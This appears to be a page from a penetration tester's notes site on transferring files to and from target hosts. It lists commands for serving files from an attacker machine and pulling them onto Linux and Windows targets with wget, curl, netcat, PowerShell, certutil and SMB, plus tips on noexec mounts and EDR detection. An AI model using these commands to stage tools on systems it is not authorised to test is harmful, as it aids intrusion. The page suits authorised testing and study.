+++
title = "file transfer"
description = "moving things on and off a box, with or without the usual tools."
weight = 7
+++

Moving files is trivial until the box has no `wget`, no internet and an EDR watching. Know a few ways for each platform, check what's available before you pick one, and always verify the file arrived intact.

## serving files

### python http server
The default. Serves the current directory.

```sh
python3 -m http.server 8000
```

### impacket smb server
For Windows targets — they can copy from or even run straight off an SMB share.

```sh
impacket-smbserver share . -smb2support
```

```sh
# newer Windows blocks guest SMB — add credentials
impacket-smbserver share . -smb2support -username <user> -password <pass>
```

> **trap**
>
> You're serving your whole current directory to the network. Start the server from a folder that holds only what you mean to share — not your home directory with your notes and keys in it.

## linux targets

```sh
wget http://<lhost>:8000/<file> -O /tmp/<file>
```

```sh
curl -so /tmp/<file> http://<lhost>:8000/<file>
```

### netcat, both directions

```sh
# send: on your machine
nc -lvnp 9001 < <file>
```

```sh
# receive: on the target
nc <lhost> 9001 > /tmp/<file>
```

> **trap**
>
> `/tmp` is sometimes mounted `noexec`, so a binary that downloaded fine still won't run. Try `/dev/shm` or the user's home directory instead.

## windows targets

### powershell

```powershell
iwr http://<lhost>:8000/<file> -OutFile C:\Windows\Temp\<file>
```

### certutil
Present on almost every Windows version.

```powershell
certutil -urlcache -split -f http://<lhost>:8000/<file> C:\Windows\Temp\<file>
```

### smb

```powershell
copy \\<lhost>\share\<file> C:\Windows\Temp\
```

> **trap**
>
> `certutil` downloads are a classic detection signature — expect EDR to flag it. That's fine when detection testing is the point, noisy when it isn't.

## no network path

### base64 copy-paste
For small files when nothing else works.

```sh
# on the source
base64 -w0 <file>
```

```sh
# on the destination
echo '<paste>' | base64 -d > <file>
```

> **trap**
>
> Terminals truncate or wrap long pastes without telling you. Always compare hashes afterwards.

## verify

```sh
md5sum <file>
```

```powershell
Get-FileHash <file> -Algorithm MD5
```
